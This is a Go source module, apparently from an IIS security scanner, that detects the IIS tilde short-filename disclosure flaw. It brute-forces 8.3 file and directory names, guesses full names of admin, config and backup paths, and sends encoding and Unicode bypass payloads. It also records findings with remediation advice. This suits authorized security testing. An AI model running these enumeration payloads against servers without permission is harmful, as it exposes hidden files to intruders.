package modules

import (
	"fmt"
	"strings"
	"time"

	"github.com/ibrahmsql/issmap/internal/config"
	"github.com/ibrahmsql/issmap/pkg/http"
	"github.com/ibrahmsql/issmap/pkg/logger"
)

// TildeModule IIS Tilde (~) Character Vulnerability modülü
type TildeModule struct {
	*BaseModule
	config *config.Config
	logger *logger.Logger
}

// NewTildeModule yeni tilde modülü oluşturur
func NewTildeModule(cfg *config.Config, log *logger.Logger) Module {
	return &TildeModule{
		BaseModule: NewBaseModule("tilde", "IIS Tilde (~) Character Vulnerability Scanner"),
		config:     cfg,
		logger:     log,
	}
}

// Run tilde modülünü çalıştırır
func (t *TildeModule) Run(client *http.Client) (*ModuleResult, error) {
	t.Start()
	defer t.End()

	var vulnerabilities []Vulnerability
	var info []Information

	baseURL := t.config.GetBaseURL()

	// 1. Tilde vulnerability tespiti
	t.logger.Debug("Tilde vulnerability tespiti yapılıyor...")
	if t.isTildeVulnerable(client, baseURL) {
		info = append(info, CreateInformation("tilde_vuln", "Tilde Vulnerability",
			"IIS Tilde (~) zafiyeti tespit edildi", "VULNERABLE"))

		// 2. Short filename enumeration
		t.logger.Debug("Short filename enumeration yapılıyor...")
		filenames := t.enumerateShortFilenames(client, baseURL)
		for _, filename := range filenames {
			info = append(info, CreateInformation("short_filename", "Short Filename",
				"8.3 format dosya adı tespit edildi", filename))
		}

		// 3. Directory enumeration
		t.logger.Debug("Directory enumeration yapılıyor...")
		directories := t.enumerateDirectories(client, baseURL)
		for _, dir := range directories {
			info = append(info, CreateInformation("short_directory", "Short Directory",
				"8.3 format dizin adı tespit edildi", dir))
		}

		// 4. Multiple encoding bypass
		t.logger.Debug("Multiple encoding bypass test ediliyor...")
		encodingVulns := t.testEncodingBypass(client, baseURL)
		vulnerabilities = append(vulnerabilities, encodingVulns...)

		// 5. Unicode normalization attacks
		t.logger.Debug("Unicode normalization attacks test ediliyor...")
		unicodeVulns := t.testUnicodeNormalization(client, baseURL)
		vulnerabilities = append(vulnerabilities, unicodeVulns...)

		// Ana zafiyet kaydı
		vuln := CreateVulnerability(
			"IIS-TILDE-001",
			"IIS Tilde (~) Character Vulnerability",
			"IIS sunucusu tilde (~) karakteri zafiyetine sahip. Bu zafiyet 8.3 format dosya/dizin adlarının enumerate edilmesine olanak sağlar.",
			"MEDIUM",
			5.3,
		)
		vuln.URL = baseURL
		vuln.Method = "GET"
		vuln.Evidence = "Tilde enumeration başarılı"
		vuln.Remediation = "IIS'de 8.3 dosya adı oluşturmayı devre dışı bırakın"
		vuln.References = []string{
			"https://www.exploit-db.com/exploits/19525",
			"https://soroush.secproject.com/blog/2014/07/iis-short-file-name-disclosure-is-back-is-your-server-vulnerable/",
		}
		vulnerabilities = append(vulnerabilities, vuln)
	} else {
		info = append(info, CreateInformation("tilde_vuln", "Tilde Vulnerability",
			"IIS Tilde (~) zafiyeti tespit edilmedi", "NOT_VULNERABLE"))
	}

	return t.CreateResult("COMPLETED", vulnerabilities, info, nil), nil
}

// isTildeVulnerable tilde zafiyetinin varlığını kontrol eder
func (t *TildeModule) isTildeVulnerable(client *http.Client, baseURL string) bool {
	// Test path'leri
	testPaths := []string{
		"/*~1*/",
		"/a*~1*/",
		"/*~1*/.aspx",
		"/*~1*/.asp",
		"/*~1*/a.aspx",
	}

	for _, path := range testPaths {
		resp, err := client.Get(baseURL + path)
		if err != nil {
			continue
		}
		t.IncrementRequests()

		// 404 dışındaki yanıtlar zafiyet göstergesi
		if resp.StatusCode != 404 {
			// Özellikle 400 Bad Request yaygın bir gösterge
			if resp.StatusCode == 400 || resp.StatusCode == 500 {
				return true
			}

			// Response body'de belirli pattern'lar
			if strings.Contains(resp.Body, "The request filtering module is configured") ||
				strings.Contains(resp.Body, "Bad Request") ||
				strings.Contains(resp.Body, "Invalid URL") {
				return true
			}
		}
	}

	return false
}

// enumerateShortFilenames kısa dosya adlarını enumerate eder
func (t *TildeModule) enumerateShortFilenames(client *http.Client, baseURL string) []string {
	var filenames []string

	// Yaygın dosya uzantıları
	extensions := []string{"asp", "aspx", "htm", "html", "txt", "xml", "config", "inc"}

	// Alfabe karakterleri ile brute force (fast modda sınırlı)
	maxChars := 'z'
	if t.config.Fast {
		maxChars = 'f' // Fast modda sadece a-f karakterleri
	}

	for _, ext := range extensions {
		for i := 'a'; i <= maxChars; i++ {
			for j := 'a'; j <= maxChars; j++ {
				shortName := fmt.Sprintf("/%c%c*~1*.%s", i, j, ext)

				resp, err := client.Get(baseURL + shortName)
				if err != nil {
					continue
				}
				t.IncrementRequests()

				// Başarılı yanıt kısa dosya adının varlığını gösterir
				if resp.StatusCode == 200 || resp.StatusCode == 403 || resp.StatusCode == 500 {
					filename := fmt.Sprintf("%c%c~1.%s", i, j, ext)
					filenames = append(filenames, filename)

					// Tam dosya adını bulmaya çalış
					fullName := t.findFullFilename(client, baseURL, filename, ext)
					if fullName != "" {
						filenames = append(filenames, fullName)
					}
				}

				// Rate limiting için delay (sadece stealth modda)
				if t.config.Stealth && t.config.Delay > 0 {
					time.Sleep(t.config.Delay / 20) // Çok kısa delay
				}
			}
		}
	}

	return filenames
}

// enumerateDirectories kısa dizin adlarını enumerate eder
func (t *TildeModule) enumerateDirectories(client *http.Client, baseURL string) []string {
	var directories []string

	// Alfabe karakterleri ile brute force (fast modda sınırlı)
	maxChars := 'z'
	if t.config.Fast {
		maxChars = 'f' // Fast modda sadece a-f karakterleri
	}

	for i := 'a'; i <= maxChars; i++ {
		for j := 'a'; j <= maxChars; j++ {
			shortDir := fmt.Sprintf("/%c%c*~1*/", i, j)

			resp, err := client.Get(baseURL + shortDir)
			if err != nil {
				continue
			}
			t.IncrementRequests()

			// Başarılı yanıt kısa dizin adının varlığını gösterir
			if resp.StatusCode == 200 || resp.StatusCode == 403 || resp.StatusCode == 500 {
				dirname := fmt.Sprintf("%c%c~1", i, j)
				directories = append(directories, dirname)

				// Tam dizin adını bulmaya çalış
				fullName := t.findFullDirectoryname(client, baseURL, dirname)
				if fullName != "" {
					directories = append(directories, fullName)
				}
			}
		}
	}

	return directories
}

// findFullFilename kısa dosya adından tam dosya adını bulmaya çalışır
func (t *TildeModule) findFullFilename(client *http.Client, baseURL, shortName, ext string) string {
	// Yaygın dosya adı pattern'ları
	commonNames := []string{
		"default", "index", "home", "main", "admin", "login", "config",
		"web", "site", "page", "test", "demo", "sample", "backup",
	}

	prefix := shortName[:2] // İlk iki karakter

	for _, name := range commonNames {
		if strings.HasPrefix(strings.ToLower(name), strings.ToLower(prefix)) {
			fullPath := fmt.Sprintf("/%s.%s", name, ext)

			resp, err := client.Head(baseURL + fullPath)
			if err != nil {
				continue
			}
			t.IncrementRequests()

			if resp.StatusCode == 200 {
				return name + "." + ext
			}
		}
	}

	return ""
}

// findFullDirectoryname kısa dizin adından tam dizin adını bulmaya çalışır
func (t *TildeModule) findFullDirectoryname(client *http.Client, baseURL, shortName string) string {
	// Yaygın dizin adı pattern'ları
	commonDirs := []string{
		"admin", "administrator", "aspnet_client", "bin", "config", "content",
		"css", "data", "files", "images", "includes", "js", "scripts", "temp",
		"upload", "uploads", "user", "users", "web", "website",
	}

	prefix := shortName[:2] // İlk iki karakter

	for _, dir := range commonDirs {
		if strings.HasPrefix(strings.ToLower(dir), strings.ToLower(prefix)) {
			fullPath := fmt.Sprintf("/%s/", dir)

			resp, err := client.Get(baseURL + fullPath)
			if err != nil {
				continue
			}
			t.IncrementRequests()

			if resp.StatusCode == 200 || resp.StatusCode == 403 {
				return dir
			}
		}
	}

	return ""
}

// testEncodingBypass multiple encoding bypass tekniklerini test eder
func (t *TildeModule) testEncodingBypass(client *http.Client, baseURL string) []Vulnerability {
	var vulns []Vulnerability

	// Encoding bypass teknikleri
	encodings := []struct {
		name    string
		payload string
	}{
		{"Double URL Encoding", "/%252a%257e1%252a/"},
		{"Unicode Encoding", "/%u002a%u007e1%u002a/"},
		{"Mixed Encoding", "/*%7e1*/"},
		{"HTML Entity Encoding", "/&#42;&#126;1&#42;/"},
		{"UTF-8 Encoding", "/%c0%aa%c0%be1%c0%aa/"},
	}

	for _, encoding := range encodings {
		resp, err := client.Get(baseURL + encoding.payload)
		if err != nil {
			continue
		}
		t.IncrementRequests()

		if resp.StatusCode != 404 && resp.StatusCode != 400 {
			vuln := CreateVulnerability(
				"IIS-TILDE-002",
				"Tilde Enumeration Encoding Bypass",
				fmt.Sprintf("Tilde enumeration %s ile bypass edilebiliyor", encoding.name),
				"MEDIUM",
				5.3,
			)
			vuln.URL = baseURL + encoding.payload
			vuln.Method = "GET"
			vuln.Payload = encoding.payload
			vuln.Evidence = fmt.Sprintf("Status: %d", resp.StatusCode)
			vuln.Remediation = "Input validation ve encoding kontrollerini güçlendirin"
			vulns = append(vulns, vuln)
		}
	}

	return vulns
}

// testUnicodeNormalization unicode normalization attack'larını test eder
func (t *TildeModule) testUnicodeNormalization(client *http.Client, baseURL string) []Vulnerability {
	var vulns []Vulnerability

	// Unicode normalization payloadları
	unicodePayloads := []string{
		"/\u002a\u007e1\u002a/",      // Unicode asterisk ve tilde
		"/\uff0a\uff5e1\uff0a/",      // Fullwidth characters
		"/\u2217\u223c1\u2217/",      // Mathematical symbols
		"/\u066d\u0653\u0031\u066d/", // Arabic characters
	}

	for _, payload := range unicodePayloads {
		resp, err := client.Get(baseURL + payload)
		if err != nil {
			continue
		}
		t.IncrementRequests()

		if resp.StatusCode != 404 && resp.StatusCode != 400 {
			vuln := CreateVulnerability(
				"IIS-TILDE-003",
				"Unicode Normalization Bypass",
				"Tilde enumeration Unicode normalization ile bypass edilebiliyor",
				"MEDIUM",
				5.3,
			)
			vuln.URL = baseURL + payload
			vuln.Method = "GET"
			vuln.Payload = payload
			vuln.Evidence = fmt.Sprintf("Status: %d", resp.StatusCode)
			vuln.Remediation = "Unicode normalization kontrollerini implement edin"
			vulns = append(vulns, vuln)
		}
	}

	return vulns
}
